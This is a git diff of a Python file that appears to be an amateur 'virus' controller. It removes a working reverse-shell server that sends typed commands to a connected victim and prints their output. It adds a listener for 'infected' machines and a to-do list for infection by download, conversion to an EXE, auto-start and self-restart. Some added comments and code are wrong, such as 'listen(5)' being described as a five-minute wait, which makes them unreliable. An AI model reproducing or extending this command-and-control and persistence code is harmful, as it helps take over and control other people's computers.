@@ -6,39 +6,33 @@ import socket
 #how a virus like this works. 
 
 
-Host = "0.0.0.0"
-Port = 443
-Max_Size = 1024 * 128
+#TO Luke <3 and Zach
 
-SEPARATOR = "<sep>"
+'''
+To Do List:
+-Way to infect (Download The file). Convert Infector to EXE when done 
+-File must start automatically
+-File must also restart itself when stopped
+
+- Currently you are able to connect to each other but only when hard coded. Possibly find a way to completely change that and have 
+it so whenever any laptop can run the code 
+'''
 
 
-s = socket.socket()
-s.bind((Host,Port))
+Host = "0.0.0.0"  #Host listens on everything
+Port = 80           #HTTP Port
 
-s.listen(5)
-print(f"Listening as {Host}:{Port} ...")
 
-client_socket, client_address = s.accept()
-print(f"{client_address[0]}:{client_address[1]} Connected!")
+s = socket.socket()  #Creating a socket 
+s.bind((Host,Port)) # binds the host IP to port 
 
-pwd = client_socket.recv(Max_Size).decode()
-print("[+] Current working directory:", pwd)
+s.listen(5)                 #Waits 5 minutes for a connection before ending
+print(f"Listening as {Host}:{Port} ...") #Tells the use what IPs to listen and port it is listening on 
 
 while True:
-    # get the command from prompt
-    command = input(f"{pwd} $> ")
-    if not command.strip():
-        # empty command
-        continue
-    # send the command to the client
-    client_socket.send(command.encode())
-    if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
-        break
-    # retrieve command results
-    output = client_socket.recv(Max_Size).decode()
-    # split command output and current directory
-    results, pwd = output.split(SEPARATOR)
-    # print output
-    print(results)
+
+    infected, client_address = s.accept()       #Accepts connection from Infected and stores Infected as the IP address and client_address as the port
+    print(f"{client_address[0]}:{client_address[1]} Connected!") #Tells the user who connected
+    infected.send("Thank You for Connecting!") #Sends a message to infected. Not currently working. Pls convert to 
+    infected.close() #Cuts connection
+
